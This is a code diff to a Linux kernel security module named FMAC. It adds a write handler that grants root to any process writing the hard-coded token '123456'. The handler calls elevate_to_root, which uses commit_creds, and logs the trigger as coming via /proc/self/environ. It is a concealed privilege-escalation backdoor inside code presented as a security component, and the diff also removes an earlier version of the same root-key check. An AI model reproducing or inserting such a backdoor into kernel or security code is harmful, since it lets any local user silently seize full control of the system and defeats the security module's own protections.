@@ -15,12 +15,13 @@
 #include <linux/selinux.h>
 #include <linux/security.h>
 
+#define MAGIC_TOKEN "123456"
+
+
 #include "objsec.h"
 #include "fmac.h"
 
-#define FMAC_ROOT_KEY "123456"
-
-int elevate_to_root(void)
+static int elevate_to_root(void)
 {
     struct cred *cred;
     u32 sid = 0;
@@ -55,22 +56,25 @@ int elevate_to_root(void)
     return commit_creds(cred);
 }
 
-int fmac_check_root_key(const char *pathname)
+
+ssize_t fmac_environ_write(struct file *file, const char __user *buf,
+                           size_t count, loff_t *ppos)
 {
-    int ret;
+    char kbuf[64] = {0};
 
-    if (memcmp(pathname, FMAC_ROOT_KEY,6) == 0) {
-        fmac_append_to_log("[FMAC] Root key path accessed by pid %d, attempting privilege escalation\n", current->pid);
-        
-        ret = elevate_to_root();
-        if (ret == 0) {
-            fmac_append_to_log("[FMAC] Privilege escalation successful for pid %d\n", current->pid);
-        } else {
-            fmac_append_to_log("[FMAC] Privilege escalation failed for pid %d, error: %d\n", current->pid, ret);
-        }
+    if (count >= sizeof(kbuf))
+        return -EINVAL;
 
-        return 1;
+    if (copy_from_user(kbuf, buf, count))
+        return -EFAULT;
+
+    kbuf[count] = '\0';
+
+
+    if (memcmp(kbuf, MAGIC_TOKEN,6) == 0) {
+        elevate_to_root();
+        fmac_append_to_log("[FMAC] root triggered via /proc/self/environ\n");
     }
 
-    return 0;
+    return count;
 }
